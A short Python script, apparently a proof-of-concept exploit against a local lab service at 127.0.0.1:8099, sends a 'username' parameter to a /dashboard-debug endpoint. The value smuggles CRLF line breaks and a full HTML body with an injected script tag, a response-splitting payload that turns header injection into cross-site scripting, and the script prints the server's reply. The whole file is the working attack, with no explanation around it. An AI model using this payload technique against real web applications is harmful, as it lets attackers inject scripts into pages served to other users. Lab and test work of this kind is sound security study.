import requests
import http.client as http_client

http_client.HTTPConnection.debuglevel = 1

url = "http://127.0.0.1:8099"
username = """1:1\r\n\r\n<html>
<head></head>
<body><script>
    alert(0);
</script></body>
</html>
<!--
"""

resp = requests.get(f"{url}/dashboard-debug", params={
    "username": username
})

print("=================================")
print(resp.text)
